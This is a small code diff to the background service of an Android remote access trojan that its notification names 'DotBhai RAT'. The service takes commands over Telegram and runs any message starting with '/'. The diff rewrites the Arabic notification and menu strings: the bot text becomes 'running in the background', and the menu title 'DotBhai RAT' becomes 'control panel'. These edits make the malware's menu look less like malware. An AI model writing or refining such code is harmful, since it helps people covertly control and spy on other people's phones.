@@ -27,7 +27,7 @@ public class BotCommandService extends Service {
             String CHANNEL_ID = "bot_channel";
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 NotificationChannel serviceChannel = new NotificationChannel(
-                        CHANNEL_ID, "Bot Service Channel", NotificationManager.IMPORTANCE_LOW);
+                        CHANNEL_ID, "Bot Service", NotificationManager.IMPORTANCE_LOW);
                 NotificationManager manager = getSystemService(NotificationManager.class);
                 if (manager != null) manager.createNotificationChannel(serviceChannel);
             }
@@ -41,7 +41,7 @@ public class BotCommandService extends Service {
             
             Notification notification = builder
                     .setContentTitle("DotBhai RAT")
-                    .setContentText("البوت شغال في الخلفية...")
+                    .setContentText("يعمل في الخلفية...")
                     .setSmallIcon(android.R.drawable.ic_menu_manage)
                     .build();
                     
@@ -80,7 +80,7 @@ public class BotCommandService extends Service {
                         String text = msg.optString("text", "");
                         if (text.startsWith("/start") || text.startsWith("/menu")) {
                             TelegramSender.sendMessageWithButtons(
-                                    "🤖 <b>DotBhai RAT</b>\nاختر:",
+                                    "🤖 <b>لوحة التحكم</b>\nاختر أمراً:",
                                     CommandHandler.mainMenu());
                         } else if (text.startsWith("/")) {
                             handler.execute(text, null);
